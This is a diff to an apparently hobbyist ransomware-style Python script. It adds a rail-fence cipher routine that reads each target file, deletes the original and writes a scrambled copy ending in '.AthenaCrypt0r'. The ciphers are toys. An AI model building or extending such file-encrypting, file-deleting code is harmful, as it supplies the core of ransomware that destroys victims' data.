@@ -6,6 +6,7 @@ import time as t
 #import urllib.request
 import reverseCryptor as rc
 import caeser as ca
+import railfence as rail
 
 def main():
     
@@ -20,7 +21,8 @@ def main():
 
     # TODO: encryption
     #reverseCryptor(files)
-    caeser(files)
+    #caeser(files)
+    RailfenceEncrypt(files,3)
 
 
 def reverseCryptor(files):
@@ -32,6 +34,20 @@ def reverseCryptor(files):
         f.close()
         os.remove(file)
         encrypted = rc.reverse(contents)
+        #print(encrypted)
+        f1 = open(file+outputfile, "w")
+        f1.write(encrypted)
+        f1.close()
+
+def RailfenceEncrypt(files, key):
+    outputfile = ".AthenaCrypt0r"
+    for file in files:
+        f = open(file, "r")
+        contents = f.read()
+        #print(contents)
+        f.close()
+        os.remove(file)
+        encrypted = rail.encryptRailFence(contents, key)
         #print(encrypted)
         f1 = open(file+outputfile, "w")
         f1.write(encrypted)
@@ -53,4 +69,4 @@ def caeser(files):
         f1.close()
 
 if __name__=="__main__":
-    main(generateKey(), generateKey())
+    main()
